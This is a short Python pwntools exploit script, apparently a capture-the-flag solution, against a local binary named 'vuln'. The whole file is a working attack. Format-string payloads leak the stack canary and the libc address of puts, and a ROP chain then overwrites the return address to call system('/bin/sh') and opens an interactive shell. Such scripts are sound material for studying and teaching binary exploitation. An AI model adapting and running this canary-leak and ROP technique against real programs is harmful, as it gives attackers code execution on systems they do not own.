from pwn import *

elf = context.binary = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


r = process(elf.path)

r.recvuntil(b"Just type something:\n")
r.sendline(b"%11$p")



leak_canary = r.recvline().strip()
leak_canary = int(leak_canary, 16)


r.sendline(b"n")

r.recvuntil(b"Just type something:\n")

r.sendline(b"%9$s".ljust(8,b"A")+p64(elf.got["puts"]))

leak_puts_libc = u64(r.recv(6).ljust(8,b"\x00"))
libc.address = leak_puts_libc - libc.symbols["puts"]


r.sendline(b"n")
r.recvuntil(b"Just type something:\n")
padding = b"A"*24

ropchain = ROP(libc)
RET = ropchain.find_gadget(["ret"])
ropchain.raw(leak_canary)
ropchain.raw(0xdeadbeef) #padding after canary
ropchain.raw(RET) #call ret gadget to not crash the program
ropchain.system(next(libc.search(b"/bin/sh")))


r.sendline(padding+bytes(ropchain))

r.sendline(b"y")
r.interactive()
